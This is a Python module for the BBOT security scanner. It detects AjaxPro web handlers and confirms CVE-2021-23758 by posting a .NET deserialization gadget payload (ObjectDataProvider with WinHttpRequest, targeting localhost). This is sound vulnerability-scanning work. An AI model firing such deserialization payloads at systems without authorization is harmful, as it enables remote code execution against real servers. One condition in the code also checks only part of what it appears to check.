import regex as re
from urllib.parse import urlparse
from bbot.modules.base import BaseModule


class ajaxpro(BaseModule):
    """
    Reference: https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/
    """

    ajaxpro_regex = re.compile(r'<script.+src="([\/a-zA-Z0-9\._]+,[a-zA-Z0-9\._]+\.ashx)"')
    watched_events = ["HTTP_RESPONSE", "URL"]
    produced_events = ["VULNERABILITY", "FINDING"]
    flags = ["active", "safe", "web-thorough"]
    meta = {
        "description": "Check for potentially vulnerable Ajaxpro instances",
        "created_date": "2024-01-18",
        "author": "@liquidsec",
    }

    async def handle_event(self, event):
        if event.type == "URL" and "dir" in event.tags:
            await self.check_url_event(event)
        elif event.type == "HTTP_RESPONSE":
            await self.check_http_response_event(event)

    async def check_url_event(self, event):
        """Handle URL events to detect Ajaxpro vulnerabilities."""
        for stem in ["ajax", "ajaxpro"]:
            probe_url = f"{event.data}{stem}/whatever.ashx"
            probe = await self.helpers.request(probe_url)
            if probe and probe.status_code == 200:
                confirm_url = f"{event.data}a/whatever.ashx"
                confirm_probe = await self.helpers.request(confirm_url)
                if confirm_probe and confirm_probe.status_code != 200:
                    await self.emit_technology(event, probe_url)
                    await self.confirm_exploitability(probe_url, event)

    async def check_http_response_event(self, event):
        """Handle HTTP response events to detect Ajaxpro vulnerabilities."""
        resp_body = event.data.get("body")
        if resp_body:
            match = await self.helpers.re.search(self.ajaxpro_regex, resp_body)
            if match:
                ajaxpro_path = match.group(0)
                await self.emit_technology(event, ajaxpro_path)
                await self.confirm_exploitability(ajaxpro_path, event)

    async def emit_technology(self, event, detection_url):
        await self.emit_event(
            {
                "host": str(event.host),
                "url": event.data if event.type == "URL" else event.data["url"],
                "technology": "ajaxpro",
            },
            "TECHNOLOGY",
            event,
            context=f"{self.meta['description']} discovered Ajaxpro instance ({event.type}) at {detection_url}",
        )

    async def confirm_exploitability(self, detection_url, event):
        """Confirm exploitability of the detected Ajaxpro instance."""
        self.debug("Ajaxpro detected, attempting to confirm exploitability")
        parsed_url = urlparse(detection_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        path = parsed_url.path.rsplit('/', 1)[0]
        full_url = f"{base_url}{path}/AjaxPro.Services.ICartService,AjaxPro.2.ashx"

        # Payload and headers defined inline
        payload = {
            "item": {
                "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                "MethodName": "Send",
                "ObjectInstance": {
                    "__type": "WinHttp.WinHttpRequest.5.1, Interop.WinHttpRequest, Version=5.1.2600.2180, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
                    "Open": {
                        "Method": "GET",
                        "Url": "http://localhost",
                        "Async": False,
                    },
                },
            },
        }
        headers = {"X-Ajaxpro-Method": "AddItem"}

        probe_response = await self.helpers.request(full_url, method="POST", headers=headers, json=payload)
        if "AjaxPro.Services.ICartService" and "MissingMethodException" in probe_response.text:
            await self.emit_event(
                {
                    "host": str(event.host),
                    "severity": "CRITICAL",
                    "url": event.data if event.type == "URL" else event.data["url"],
                    "description": f"Ajaxpro Deserialization RCE (CVE-2021-23758) Trigger: [{full_url}]",
                },
                "VULNERABILITY",
                event,
                context=f"{self.meta['description']} discovered Ajaxpro instance ({event.type}) at {detection_url}",
            )
